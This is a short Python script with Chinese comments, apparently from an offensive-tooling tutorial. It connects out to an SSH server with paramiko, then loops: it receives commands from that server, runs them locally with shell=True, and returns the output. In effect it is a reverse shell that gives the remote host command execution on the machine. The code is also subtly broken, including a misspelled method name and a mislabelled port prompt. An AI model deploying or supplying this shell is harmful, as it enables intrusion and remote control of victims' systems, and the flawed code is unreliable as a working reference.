"""
一般來說 SSH 客戶端連線到 SSH 伺服器端，因為許多 Windows 沒有內建 SSH 伺服器，
所以我們需要反過來從 SSH 伺服器把命令傳到 SSH 客戶端
"""
import shlex
import subprocess
import paramiko

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missinf_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    # 反過來從 SSH 伺服器把命令傳到 SSH 客戶端
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        # 從 ssh 連接裡不斷讀取命令
        print(ssh_session.recv(1024).decode())
        while True:
            # 取得命令
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd=='exit':
                    client.close()
                    break

                # 在本地端執行命令
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                # 將結果發送回伺服器
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()

    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    
    ip = input('Enter server IP: ')
    port = input('Enter input: ')
    ssh_command(ip, port, user, password, 'ClientConnected')
